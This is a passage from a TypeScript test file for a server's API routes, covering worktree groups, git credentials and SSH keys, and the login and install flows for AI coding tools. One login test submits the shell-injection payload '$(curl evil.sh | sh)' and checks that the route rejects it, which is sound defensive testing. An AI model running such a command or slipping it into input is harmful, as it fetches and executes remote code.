        { type: 'error', error: { code: 'NOT_FOUND', message: 'missing' } },
      ])
    })
  })

  describe('POST /worktree/stop', () => {
    it('rejects a missing worktreeId', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/stop', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('delegates to stopWorktree and returns the result', async () => {
      mockDeleteSession.mockResolvedValue({
        worktreeId: 'sess-x',
        projectSlug: 'demo',
        jobName: 'yaac-demo-sess-x',
      })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.stop.$post({ json: { worktreeId: 'sess-x' } })
      expect(res.status).toBe(200)
      expect(mockDeleteSession).toHaveBeenCalledWith('sess-x')
    })
  })

  // The sidebar's groups, end to end through the routes: what the webapp
  // creates, drags between and deletes has to come back on the snapshot the
  // same way, and a stale group id has to fail rather than file a worktree
  // where nothing lists it.
  describe('worktree group routes', () => {
    const client = (): ReturnType<typeof makeTestApiClient> =>
      makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))

    const seed = async (...worktreeIds: string[]): Promise<void> => {
      for (const worktreeId of worktreeIds) {
        await recordWorktreeCreated({ projectSlug: 'demo', worktreeId })
      }
    }

    /** Create a group around `worktreeId` and hand back its new id. */
    const createGroup = async (worktreeId: string, name = 'Release'): Promise<string> => {
      const res = await client().worktree.group.create.$post({
        json: { projectSlug: 'demo', worktreeId, name },
      })
      expect(res.status).toBe(200)
      return (await res.json()).groupId
    }

    it('creates a group around a worktree and surfaces it for the snapshot', async () => {
      await seed('sess-a')
      const groupId = await createGroup('sess-a')

      expect(await listWorktreeGroups('demo')).toEqual([expect.objectContaining({
        groupId, projectSlug: 'demo', name: 'Release', pinned: false,
      })])
      expect((await getProjectWorktreeRows('demo')).get('sess-a')?.groupId).toBe(groupId)
    })

    it('renames, pins and deletes it, releasing its worktrees', async () => {
      await seed('sess-a')
      const groupId = await createGroup('sess-a')

      await client().worktree.group.rename.$post({ json: { projectSlug: 'demo', groupId, name: 'Shipping' } })
      await client().worktree.group['set-pinned'].$post({ json: { projectSlug: 'demo', groupId, pinned: true } })
      expect(await listWorktreeGroups('demo')).toEqual([expect.objectContaining({
        name: 'Shipping', pinned: true,
      })])

      await client().worktree.group.delete.$post({ json: { projectSlug: 'demo', groupId } })
      expect(await listWorktreeGroups('demo')).toEqual([])
      expect((await getProjectWorktreeRows('demo')).get('sess-a')?.groupId).toBeUndefined()
    })

    it('moves a worktree in and out of a group, and 404s an unknown one', async () => {
      await seed('sess-a', 'sess-b')
      const groupId = await createGroup('sess-a')

      await client().worktree['set-group'].$post({
        json: { projectSlug: 'demo', worktreeId: 'sess-b', groupId },
      })
      expect((await getProjectWorktreeRows('demo')).get('sess-b')?.groupId).toBe(groupId)

      await client().worktree['set-group'].$post({
        json: { projectSlug: 'demo', worktreeId: 'sess-b', groupId: null },
      })
      expect((await getProjectWorktreeRows('demo')).get('sess-b')?.groupId).toBeUndefined()

      // A drop onto a group another client has already deleted.
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/set-group', withAuth({
        method: 'POST',
        body: JSON.stringify({ projectSlug: 'demo', worktreeId: 'sess-b', groupId: 'gone' }),
      }))
      expect(res.status).toBe(404)
    })

    it('404s a group created around a worktree that is not there', async () => {
      // Otherwise the group row lands with no member — invisible in the
      // sidebar, and so undeletable from it.
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/group/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ projectSlug: 'demo', worktreeId: 'nope', name: 'Release' }),
      }))
      expect(res.status).toBe(404)
      expect(await listWorktreeGroups('demo')).toEqual([])
    })

    it('rejects a group name longer than the store keeps', async () => {
      // The store normalizes to MAX_TITLE_LENGTH, so accepting a longer name
      // would truncate it on the way to the table — and two distinct names
      // sharing their first MAX_TITLE_LENGTH characters would then resolve
      // to one group.
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/group/create', withAuth({
        method: 'POST',
        body: JSON.stringify({
          projectSlug: 'demo',
          worktreeId: 'sess-a',
          name: 'x'.repeat(MAX_TITLE_LENGTH + 1),
        }),
      }))
      expect(res.status).toBe(400)
      expect(await listWorktreeGroups('demo')).toEqual([])
    })

    it('rejects a blank group name', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/group/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ projectSlug: 'demo', worktreeId: 'sess-a', name: '' }),
      }))
      expect(res.status).toBe(400)
    })
  })

  describe('POST /auth/clear', () => {
    it('rejects an unknown service', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/clear', withAuth({
        method: 'POST',
        body: JSON.stringify({ service: 'mystery' }),
      }))
      expect(res.status).toBe(400)
    })

    it('clears claude credentials when service=claude', async () => {
      await saveClaudeOAuthBundle(SAMPLE_BUNDLE)
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.clear.$post({ json: { service: 'claude' } })
      expect(res.status).toBe(204)
      expect(await loadClaudeCredentialsFile()).toBeNull()
    })
  })

  describe('POST /auth/git/credentials', () => {
    it('rejects a missing name or token', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      for (const body of [{ token: 'ghp_x' }, { name: 'gh' }, { name: 'gh', token: '' }]) {
        const res = await app.request('/auth/git/credentials', withAuth({
          method: 'POST', body: JSON.stringify(body),
        }))
        expect(res.status).toBe(400)
      }
    })

    it('stores a named token without pushing — no project uses it yet — and refuses a taken name', async () => {
      const synced = vi.spyOn(worktreeDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
        const res = await client.auth.git.credentials.$post({ json: { name: 'gh', token: 'ghp_new' } })
        expect(res.status).toBe(200)
        const { id } = await res.json()
        expect(await listCredentialSummaries()).toEqual([
          { id, name: 'gh', kind: 'https', preview: '***_new', projects: [] },
        ])
        expect(synced).not.toHaveBeenCalled()

        const again = await client.auth.git.credentials.$post({ json: { name: 'gh', token: 'ghp_other' } })
        expect(again.status).toBe(409)
      } finally {
        synced.mockRestore()
      }
    })
  })

  describe('POST /auth/git/ssh-keys', () => {
    it('generates a named key, answers the public half, and leaves no private material behind', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git['ssh-keys'].$post({ json: { name: 'deploy' } })
      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body).toEqual({
        id: expect.any(String) as string,
        publicKey: expect.stringMatching(/^ssh-ed25519 AAAAC3NzaC1lZDI1NTE5\S+ deploy$/) as string,
      })
      expect((await listCredentialSummaries())[0]).toMatchObject({ name: 'deploy', kind: 'ssh', publicKey: body.publicKey })
      // Nothing under the data dir's credentials holds anything about it.
      const credDir = path.join(tmpDir, 'server-local', '.credentials')
      for (const name of await fs.readdir(credDir).catch(() => [] as string[])) {
        expect(await fs.readFile(path.join(credDir, name), 'utf8')).not.toContain('ssh-ed25519')
      }
    })

    it('rejects a blank name', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git['ssh-keys'].$post({ json: { name: '  ' } })
      expect(res.status).toBe(400)
    })
  })

  describe('PATCH /auth/git/credentials/:id', () => {
    it('renames a credential, and 404s an unknown id', async () => {
      const { id } = await addHttpsCredential({ name: 'old', token: 'ghp_x' })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth.git.credentials[':id'].$patch({ param: { id }, json: { name: 'new' } })
      expect(res.status).toBe(204)
      expect((await listCredentialSummaries()).map((c) => c.name)).toEqual(['new'])

      const missing = await client.auth.git.credentials[':id'].$patch({
        param: { id: '00000000-0000-4000-8000-000000000000' }, json: { name: 'x' },
      })
      expect(missing.status).toBe(404)
    })
  })

  describe('DELETE /auth/git/credentials/:id', () => {
    it('deletes a credential in use and takes it from the runtime at once', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const a = await addHttpsCredential({ name: 'a', token: 'ghp_a' })
      await assignProjectCredential('web', a.id)
      const synced = vi.spyOn(worktreeDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
        const res = await client.auth.git.credentials[':id'].$delete({ param: { id: a.id } })
        expect(res.status).toBe(204)
        expect(await listCredentialSummaries()).toEqual([])
        expect(synced.mock.calls.at(-1)?.[0].git).toEqual([])
      } finally {
        synced.mockRestore()
      }
    })

    it('deletes, but answers RUNTIME_UNAVAILABLE when the runtime could not be told', async () => {
      // A delete is how a leak is dealt with: "done" must not be said while
      // the proxy still holds the credential.
      const { id } = await addHttpsCredential({ name: 'a', token: 'ghp_a' })
      const synced = vi.spyOn(worktreeDriver(), 'syncCredentials').mockRejectedValue(new Error('apiserver down'))
      try {
        const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
        const res = await client.auth.git.credentials[':id'].$delete({ param: { id } })
        expect(res.status).toBe(503)
        expect(await res.text()).toMatch(/deleted, but the egress proxy could not be updated.*apiserver down/)
        expect(await listCredentialSummaries()).toEqual([])
      } finally {
        synced.mockRestore()
      }
    })

    it('returns 404 for an unknown id, and 400 for a malformed one', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      expect((await client.auth.git.credentials[':id'].$delete({
        param: { id: '00000000-0000-4000-8000-000000000000' },
      })).status).toBe(404)
      expect((await client.auth.git.credentials[':id'].$delete({ param: { id: 'nope' } })).status).toBe(400)
    })
  })

  describe('POST /auth/git/credentials/:id/replace', () => {
    it('replaces the secret under the same name and projects, and pushes it', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const { id } = await addHttpsCredential({ name: 'gh', token: 'ghp_leaked' })
      await assignProjectCredential('web', id)
      const synced = vi.spyOn(worktreeDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
        const res = await client.auth.git.credentials[':id'].replace.$post({ param: { id }, json: { token: 'ghp_fresh' } })
        expect(res.status).toBe(200)
        const body = await res.json()
        expect(await listCredentialSummaries()).toEqual([
          { id: body.id, name: 'gh', kind: 'https', preview: '***resh', projects: ['web'] },
        ])
        expect(synced.mock.calls.at(-1)?.[0].git).toEqual([{ token: 'ghp_fresh', projects: ['web'] }])
      } finally {
        synced.mockRestore()
      }
    })
  })

  describe('PUT /project/:slug/git-credential', () => {
    it('assigns the credential and hands the runtime what the project may now use', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const { id } = await addHttpsCredential({ name: 'gh', token: 'ghp_web' })
      const synced = vi.spyOn(worktreeDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
        const res = await client.project[':slug']['git-credential'].$put({
          param: { slug: 'web' }, json: { credentialId: id },
        })
        expect(res.status).toBe(200)
        expect(await res.json()).toEqual({ knownHostsEntry: null })
        // The runtime injects from what it was last told, never from the store.
        expect(synced.mock.calls.at(-1)?.[0].git).toEqual([{ token: 'ghp_web', projects: ['web'] }])
      } finally {
        synced.mockRestore()
      }
    })

    it('404s an unknown project or credential', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const { id } = await addHttpsCredential({ name: 'gh', token: 'ghp_web' })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      expect((await client.project[':slug']['git-credential'].$put({
        param: { slug: 'nope' }, json: { credentialId: id },
      })).status).toBe(404)
      expect((await client.project[':slug']['git-credential'].$put({
        param: { slug: 'web' }, json: { credentialId: '00000000-0000-4000-8000-000000000000' },
      })).status).toBe(404)
    })
  })

  describe('PUT /auth/:tool', () => {
    it('persists a claude api-key payload', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth[':tool'].$put({
        param: { tool: 'claude' },
        json: { kind: 'api-key', apiKey: 'sk-ant-api03-new' },
      })
      expect(res.status).toBe(204)
      const entry = await loadClaudeCredentialsFile()
      expect(entry?.kind).toBe('api-key')
    })

    it('rejects an unknown tool', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/gemini', withAuth({
        method: 'PUT',
        body: JSON.stringify({ kind: 'api-key', apiKey: 'x' }),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects api-key payloads with empty apiKey', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth[':tool'].$put({
        param: { tool: 'claude' },
        json: { kind: 'api-key', apiKey: '' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('tool login routes', () => {
    let teardownAgent: () => void

    beforeEach(() => {
      teardownAgent = installLoopbackAgent()
      process.env.YAAC_E2E_CODEX_LOGIN_CLI = JSON.stringify([process.execPath, CODEX_STUB])
      process.env.YAAC_E2E_CLAUDE_LOGIN_CLI = JSON.stringify([process.execPath, CLAUDE_STUB])
    })

    afterEach(() => {
      teardownAgent()
      clearAllToolLoginsForTests()
      delete process.env.YAAC_E2E_CODEX_LOGIN_CLI
      delete process.env.YAAC_E2E_CLAUDE_LOGIN_CLI
      delete process.env.FAKE_LOGIN_MODE
    })

    it('returns AUTH_AGENT_DISCONNECTED (503) when no auth server is connected', async () => {
      teardownAgent() // drop the loopback agent for this case
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
      expect(res.status).toBe(503)
      const body = await res.json() as unknown as { error: { code: string; message: string } }
      expect(body.error.code).toBe('AUTH_AGENT_DISCONNECTED')
      expect(body.error.message).toMatch(/yaac auth (update|server start)/)
      teardownAgent = installLoopbackAgent() // restore for afterEach symmetry
    })

    it('reports agent connectivity on GET /auth/agent', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const connectedRes = await client.auth.agent.$get()
      expect(await connectedRes.json()).toEqual({ connected: true })
      teardownAgent()
      const disconnectedRes = await client.auth.agent.$get()
      expect(await disconnectedRes.json()).toEqual({ connected: false })
      teardownAgent = installLoopbackAgent()
    })

    it('start → poll → success over the wire', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'codex' } })
      if (!startRes.ok) throw new Error('login start failed')
      const started = await startRes.json()
      expect(started.tool).toBe('codex')

      await vi.waitFor(async () => {
        const res = await client.auth.login[':id'].$get({ param: { id: started.id } })
        expect(res.status).toBe(200)
        expect((await res.json()).status).toBe('success')
      }, { timeout: 10_000, interval: 50 })
    })

    it('rejects starting a login for opencode', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/opencode/login/start', withAuth({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('rejects non-code input as VALIDATION through the route', async () => {
      process.env.FAKE_LOGIN_MODE = 'need-input'
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
      if (!startRes.ok) throw new Error('login start failed')
      const started = await startRes.json()

      const res = await client.auth.login[':id'].input.$post({
        param: { id: started.id },
        json: { text: '$(curl evil.sh | sh)' },
      })
      expect(res.status).toBe(400)
      const body = await res.json() as unknown as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('404s polling or feeding input to an unknown session; cancel is a no-op 204', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const get = await client.auth.login[':id'].$get({ param: { id: 'nope' } })
      expect(get.status).toBe(404)
      const input = await client.auth.login[':id'].input.$post({ param: { id: 'nope' }, json: { text: 'x' } })
      expect(input.status).toBe(404)
      const cancel = await client.auth.login[':id'].cancel.$post({ param: { id: 'nope' } })
      expect(cancel.status).toBe(204)
    })
  })

  describe('tool install routes', () => {
    let teardownAgent: () => void

    beforeEach(() => {
      teardownAgent = installLoopbackAgent()
      process.env.YAAC_E2E_CLAUDE_INSTALL_CLI = JSON.stringify([process.execPath, INSTALL_STUB])
    })

    afterEach(() => {
      teardownAgent()
      clearAllToolInstallsForTests()
      delete process.env.YAAC_E2E_CLAUDE_INSTALL_CLI
    })

    it('start → poll → success over the wire', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const startRes = await client.auth[':tool'].install.start.$post({ param: { tool: 'claude' } })
      if (!startRes.ok) throw new Error('install start failed')
      const started = await startRes.json()
      expect(started.tool).toBe('claude')

      await vi.waitFor(async () => {
        const res = await client.auth.install[':id'].$get({ param: { id: started.id } })
        expect(res.status).toBe(200)
        expect((await res.json()).status).toBe('success')
      }, { timeout: 10_000, interval: 50 })
    })

    it('rejects starting an install for opencode', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/auth/opencode/install/start', withAuth({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('404s polling an unknown install; cancel is a no-op 204', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const get = await client.auth.install[':id'].$get({ param: { id: 'nope' } })
      expect(get.status).toBe(404)
      const cancel = await client.auth.install[':id'].cancel.$post({ param: { id: 'nope' } })
      expect(cancel.status).toBe(204)
    })
  })

  describe('body parsing', () => {
    it('malformed JSON maps to VALIDATION 400', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({
        method: 'POST',
        body: '{not-json',
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('array body is rejected as VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({
        method: 'POST',
        body: JSON.stringify([]),
      }))
      expect(res.status).toBe(400)
    })
  })

  // Ensure the helper path fixtures don't leak if we add them later.
  it('write routes do not touch state before invocation', async () => {
    expect(await fs.readdir(getProjectsDir()).catch(() => [])).toEqual([])
    expect(projectDir('never')).toContain('never')
    expect(claudeDir('never')).toContain('claude')
    expect(codexDir('never')).toContain('codex')
  })
})
